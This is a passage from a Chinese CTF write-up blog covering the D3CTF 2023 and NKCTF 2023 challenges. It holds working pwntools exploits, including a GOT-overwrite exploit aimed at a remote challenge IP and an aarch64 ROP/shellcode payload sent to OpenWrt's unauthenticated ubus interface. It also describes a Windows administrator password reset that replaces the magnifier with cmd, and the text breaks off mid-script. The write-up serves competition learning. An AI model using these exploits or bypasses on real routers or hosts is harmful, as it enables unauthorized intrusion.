class="hljs-number">99</span>):<br>    Down()  <br>    <span class="hljs-built_in">print</span>(i)<br>p.readuntil(<span class="hljs-string">&#x27;You have coins: &#x27;</span>)<br>coin=<span class="hljs-built_in">int</span>(p.readline())<br><span class="hljs-built_in">print</span>(coin)<br><span class="hljs-comment">#p.interactive()</span><br><span class="hljs-keyword">if</span> coin%<span class="hljs-number">100</span> &lt; (coin-<span class="hljs-number">2551</span>)%<span class="hljs-number">100</span>:<br>    <span class="hljs-keyword">while</span> coin&gt;=<span class="hljs-number">100</span>:<br>        addatk(<span class="hljs-number">1</span>)<br>        coin-=<span class="hljs-number">100</span><br>     <span class="hljs-comment">#   pause()</span><br><span class="hljs-keyword">else</span>:<br>    addatk(<span class="hljs-number">3</span>)<br>    coin-=<span class="hljs-number">2551</span><br>    <span class="hljs-keyword">while</span> coin&gt;=<span class="hljs-number">100</span>:<br>      <span class="hljs-comment">#  pause()</span><br>        addatk(<span class="hljs-number">1</span>)<br>        coin-=<span class="hljs-number">100</span><br>Down()<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;li $a1,0</span><br><span class="hljs-string">li $a2,0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>shell=asm(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shell))<br>p.interactive()<br>p.send(shell)<br>pause()<br><span class="hljs-comment">#p.send(asm(shellcraft.sh()))</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="easy-LzhiFTP">easy_LzhiFTP</h3><p>在<code>touch</code>时存在数组越界,当创建第<code>17</code>个成员时会将第<code>1</code>个成员设置为第<code>17</code>个成员的<code>size</code>,可以做到任意地址读写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./ftp&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;39.106.65.236 30913&quot;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./ftp&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">&quot;Username: &quot;</span>,<span class="hljs-string">&#x27;rot&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Password: &#x27;</span>,<span class="hljs-string">b&#x27;r\0\0\0&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touch</span>(<span class="hljs-params">filename</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;FTP&gt; &quot;</span>,<span class="hljs-string">b&quot;touch %s&quot;</span>%filename)<br>    p.sendlineafter(<span class="hljs-string">&quot;Context&quot;</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;FTP&gt; &#x27;</span>,<span class="hljs-string">b&#x27;edit&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;FTP&gt; &#x27;</span>,<span class="hljs-string">b&#x27;del&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;No)&#x27;</span>,<span class="hljs-string">b&#x27;No%19$p&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Choice:No&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)<br>e.address=d-<span class="hljs-number">0x1d29</span><br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    touch(<span class="hljs-built_in">str</span>(i).encode())<br><br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#touch(p64(0))</span><br>touch(p64(free_got))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023年D3CTF-pwn</title>
    <link href="/page/wp/2023%E5%B9%B4D3ctf-pwn/"/>
    <url>/page/wp/2023%E5%B9%B4D3ctf-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="d3op">d3op</h2><h3 id="预操作">预操作</h3><p>解压附件之后得到三个文件: <code>start.sh</code>,<code>squashfs-root.img</code>,<code>Image</code><br>执行<code>start.sh</code>之后，启动了一个虚拟机，查看<code>/etc/os-release</code>之后发现虚拟机是<code>openwrt 22.03.3</code>版本的固件，架构为<code>armvirt/64</code>,到官网上下载对应版本的文件镜像<code>https://archive.openwrt.org/releases/22.03.3/targets/armvirt/64/openwrt-22.03.3-armvirt-64-rootfs-squashfs.img.gz</code><br>使用 <code>unsquashfs</code> 解压题目里的文件镜像和下载的文件镜像，然后使用<code>color_diff -r squ1 squ2</code>，查看两个文件镜像中的不同</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs diff">diff: sq1/etc/localtime: 没有那个文件或目录<br>diff: sq2/etc/localtime: 没有那个文件或目录<br>diff: sq1/etc/ppp/resolv.conf: 没有那个文件或目录<br>diff: sq2/etc/ppp/resolv.conf: 没有那个文件或目录<br>diff: sq1/etc/resolv.conf: 没有那个文件或目录<br>diff: sq2/etc/resolv.conf: 没有那个文件或目录<br>只在 sq2/dev 存在：console<br>只在 sq1/etc/config 存在：network<br>diff -r sq1/etc/shadow sq2/etc/shadow<br>1c1<br>&lt; root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:19442::::::<br><span class="hljs-comment">---</span><br>&gt; root:::0:99999:7:::<br>diff: sq1/etc/TZ: 没有那个文件或目录<br>diff: sq2/etc/TZ: 没有那个文件或目录<br>只在 sq1 存在：flag<br>diff: sq1/sbin/insmod: 没有那个文件或目录<br>diff: sq2/sbin/insmod: 没有那个文件或目录<br>diff: sq1/sbin/lsmod: 没有那个文件或目录<br>diff: sq2/sbin/lsmod: 没有那个文件或目录<br>diff: sq1/sbin/modinfo: 没有那个文件或目录<br>diff: sq2/sbin/modinfo: 没有那个文件或目录<br>diff: sq1/sbin/modprobe: 没有那个文件或目录<br>diff: sq2/sbin/modprobe: 没有那个文件或目录<br>diff: sq1/sbin/rmmod: 没有那个文件或目录<br>diff: sq2/sbin/rmmod: 没有那个文件或目录<br>diff: sq1/usr/bin/scp: 没有那个文件或目录<br>diff: sq2/usr/bin/scp: 没有那个文件或目录<br>diff: sq1/usr/bin/ssh: 没有那个文件或目录<br>diff: sq2/usr/bin/ssh: 没有那个文件或目录<br>diff: sq1/usr/bin/wget: 没有那个文件或目录<br>diff: sq2/usr/bin/wget: 没有那个文件或目录<br>只在 sq1/usr/libexec/rpcd 存在：base64<br>diff -r sq1/usr/share/rpcd/acl.d/unauthenticated.json sq2/usr/share/rpcd/acl.d/unauthenticated.json<br>2,16c2,12<br>&lt;     &quot;unauthenticated&quot;: &#123;<br>&lt;         &quot;description&quot;: &quot;Access controls for unauthenticated requests&quot;,<br>&lt;         &quot;read&quot;: &#123;<br>&lt;             &quot;ubus&quot;: &#123;<br>&lt;                 &quot;session&quot;: [<br>&lt;                     &quot;access&quot;,<br>&lt;                     &quot;login&quot;<br>&lt;                 ],<br>&lt;                 &quot;base64&quot;: [<br>&lt;                     &quot;decode&quot;,<br>&lt;                     &quot;encode&quot;<br>&lt;                 ]<br>&lt;             &#125;<br>&lt;         &#125;<br>&lt;     &#125;<br><span class="hljs-comment">---</span><br>&gt; &quot;unauthenticated&quot;: &#123;<br>&gt; &quot;description&quot;: &quot;Access controls for unauthenticated requests&quot;,<br>&gt; &quot;read&quot;: &#123;<br>&gt; &quot;ubus&quot;: &#123;<br>&gt; &quot;session&quot;: [<br>&gt; &quot;access&quot;,<br>&gt; &quot;login&quot;<br>&gt; ]<br>&gt; &#125;<br>&gt; &#125;<br>&gt; &#125;<br></code></pre></td></tr></table></figure><p>发现在题目中允许未认证访问的<code>ubus</code>接口中多了一个<code>base64</code>方法，同时在<code>/usr/libexec/rpcd</code>中多了一个<code>base64</code>文件,所以猜测无需认证即可访问的<code>ubus</code>中<code>base64</code>方法就是<code>/usr/lib/exec/rpcd/base64</code></p><h3 id="分析base64文件">分析base64文件</h3><p><img src="/img/blog_img/D3CTF/2023_d3ctf_d3op.png" srcset="/img/loading.gif" lazyload alt="关键函数" title="关键函数"></p><p><img src="/img/blog_img/D3CTF/2023_d3ctf_d3op-1.png" srcset="/img/loading.gif" lazyload alt="加解密函数" title="加解密函数"></p><p>经过分析我们发现在<code>base64</code>方法中存在溢出漏洞</p><h3 id="访问">访问</h3><p><a href="https://www.likecs.com/show-307589624.html">关于unauthenticated</a>，在这个文章里面我知道了在<code>unauthenticated</code>中<code>ubus</code>接口可以直接使用<code>http://ip:port/ubus</code>访问，同时知道了访问时应该传入<code>&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;00000000000000000000000000000000&quot;,&quot;方法&quot;,&quot;方法的行为&quot;,&#123;&quot;参数&quot;:&quot;参数值&quot;&#125;]&#125;'</code></p><p>在<code>/usr/lib/lua/luci/controller/admin/index.lua</code>中存在<code>action_ubus</code>函数，在<code>/usr/share/luci/menu.d/luci-base.json</code>中将<code>action_ubus</code>函数注册为了<code>admin/ubus</code>，可以访问<code>http://ip:port/cgi-bin/luci/admin/ubus</code>来执行<code>action_ubus</code>函数<br>通过分析<code>action_ubus</code>函数发现传入的参数中需要存在<code>jsonrpc</code>且值必须为<code>&quot;2.0&quot;</code>，并且参数中<code>id</code>不能为空,然后<code>method</code>是设置行为，可以是<code>list/call</code>,然后<code>params</code>是一个列表,其中第一个必须是<code>00000000000000000000000000000000</code>，然后就是方法，再是方法的行为，再是方法的行为的参数，整合起来就是一个<code>json</code>格式的字符串<code>&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;00000000000000000000000000000000&quot;,&quot;方法&quot;,&quot;方法的行为&quot;,&#123;&quot;参数&quot;:&quot;参数值&quot;&#125;]&#125;'</code>，这与搜索到的使用方法是一致的</p><p>既然已知<code>base64</code>方法中存在漏洞，而且触发的方式也知道了就可以直接攻击了，因为是目标是网站，所以不能使用<code>system(&quot;/bin/sh&quot;)</code>的方式获取<code>shell</code>，但可以尝试反弹<code>shell</code>或者直接使用<code>orw</code>获取<code>flag</code></p><h3 id="getflag">getflag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">需要注意的点有，输出必须是json格式，并且是一个完整的json格式，不能有多的数据导致json解析失败，否则会返回 &#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;result&quot;:[2]&#125;</span><br><span class="hljs-string">然后就是需要保证程序退出是正常退出，否则会返回 &#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;result&quot;:[5]&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br>e=ELF(<span class="hljs-string">&quot;./base64&quot;</span>)<br>bss=<span class="hljs-number">0x4a2098</span><br>bss_seg=<span class="hljs-number">0x4a2000</span><br>context.binary=e<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    因为aarch64架构的汇编指令中ret指令不会像x86/x86_64架构那样会从栈中获取数据，然后再返回</span><br><span class="hljs-string">    在aarch64架构中ret指令就只是将x30寄存器的值放到pc寄存器中</span><br><span class="hljs-string">    所以找的gadget必须要存在利用栈修改x30寄存器的指令</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>x0=<span class="hljs-number">0x0000000000403c84</span> <span class="hljs-comment"># ldr x0, [sp, #0x38]; ldp x29, x30, [sp], #0x40; ret; </span><br>mprotect=<span class="hljs-number">0x4579a4</span><br><br><br>nop=asm(<span class="hljs-string">&quot;nop&quot;</span>)<br>shellcode=shellcraft.setuid(<span class="hljs-number">0</span>)+shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)+\<br>    <span class="hljs-string">&quot;nop\nnop\nnop\n&quot;</span>+\<br>    shellcraft.read(<span class="hljs-number">3</span>,bss+<span class="hljs-number">14</span>,<span class="hljs-number">100</span>)+\<br>    shellcraft.write(<span class="hljs-number">1</span>,bss,<span class="hljs-number">0x42</span>)+\<br>    shellcraft.exit(<span class="hljs-number">0</span>)<br><br>payload=<span class="hljs-string">b&#x27;&#123;&quot;output&quot;: &quot;&#x27;</span>.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+<span class="hljs-string">b&#x27;&quot;&#125;&#x27;</span><br>data=<span class="hljs-built_in">len</span>(payload)<br>payload+=nop*<span class="hljs-number">0x40</span>+asm(shellcode)<br>payload=payload.ljust(<span class="hljs-number">0x418</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p32(<span class="hljs-number">0x64b</span>)+p32(<span class="hljs-number">0x41d</span>)+p32(<span class="hljs-number">0x584</span>)+p32(<span class="hljs-number">0x4b8</span>)<br>payload+=p64(<span class="hljs-number">0</span>)+p64(x0)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment">#458</span><br>payload+=p64(<span class="hljs-number">0</span>)+p64(mprotect)+p64(<span class="hljs-number">0</span>)+p64(bss_seg+<span class="hljs-number">0x1000</span>)+p64(bss_seg)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(bss-<span class="hljs-number">0x28</span>)<br>payload+=p64(bss)+p64(bss+data)<br><br>payload=base64.b64encode(payload)<br><br>para=&#123;<span class="hljs-string">&quot;input&quot;</span>:payload.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)&#125;<br>data=&#123;<span class="hljs-string">&quot;jsonrpc&quot;</span>:<span class="hljs-string">&quot;2.0&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;call&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:[<span class="hljs-string">&quot;00000000000000000000000000000000&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;decode&quot;</span>,para]&#125;<br><br>url=<span class="hljs-string">&#x27;http://127.0.0.1:4444/ubus&#x27;</span> <br><span class="hljs-comment"># 访问 http://ip:port/cgi-bin/luci/admin/ubus 也是一样的</span><br>r=requests.post(url,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;,data=json.dumps(data))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023NKCTF-wp</title>
    <link href="/page/wp/NKCTF2023/"/>
    <url>/page/wp/NKCTF2023/</url>
    
    <content type="html"><![CDATA[<p>rank：15<br><img src="/img/blog_img/NKCTF/page_Image/png0.png" srcset="/img/loading.gif" lazyload alt=""></p><h1>Misc</h1><h2 id="hard-misc">hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p><h2 id="blue">blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p><p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p><p><img src="/img/blog_img/NKCTF/page_Image/png1.png" srcset="/img/loading.gif" lazyload alt=""></p><p>复制一份cmd到放大镜</p><p><img src="/img/blog_img/NKCTF/page_Image/png2.png" srcset="/img/loading.gif" lazyload alt=""></p><p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p><p><img src="/img/blog_img/NKCTF/page_Image/png3.png" srcset="/img/loading.gif" lazyload alt=""></p><p>进入系统</p><p><img src="/img/blog_img/NKCTF/page_Image/png4.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="easymusic">easymusic</h2><p>根据提示百度，搜到类似的一题<a href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p><p>使用<code>OpenPuff</code>工具</p><p>文件尾得到<code>psdC:01374890</code></p><p>其他两个密码暂时没找到，但是一看这题的<code>psdC</code>和天翼杯的<code>psdC</code>一样，盲猜A和B也一样</p><p>导出flag.txt</p><p><img src="/img/blog_img/NKCTF/page_Image/png5.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="easy-rgb">easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p><p>得到key：<code>NKCTF2023</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png6.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p><p>在线aes-128解密，key为<code>NKCTF2023</code></p><h2 id="first-spam-of-rabbit-year">first spam of rabbit year</h2><p><a href="">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p><p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p><p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure><p>0宽得到key：<code>EnoOoO1G</code></p><p>根据结尾的提示，密文rot47，key rot13</p><p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p><p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p><h2 id="misc-iot">misc?iot!</h2><blockquote><p><a href="https://www.anquanke.com/post/id/229321">https://www.anquanke.com/post/id/229321</a></p></blockquote><p>选择<code>arm little-endian</code></p><p>如果要写地址默认为<code>0x8000000</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png7.png" srcset="/img/loading.gif" lazyload alt=""></p><p>sub_800014C是rc4生成密钥的过程</p><p><img src="/img/blog_img/NKCTF/page_Image/png8.png" srcset="/img/loading.gif" lazyload alt=""></p><p>复制密钥的过程，得到key：<code>NKCTF2023</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png9.png" srcset="/img/loading.gif" lazyload alt=""></p><p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png10.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p><h2 id="easy-word">easy_word</h2><p>根据注释中的提示爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p><p><code>cloacked-pixel</code>得到flag</p><p><img src="/img/blog_img/NKCTF/page_Image/png11.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="三体">三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> 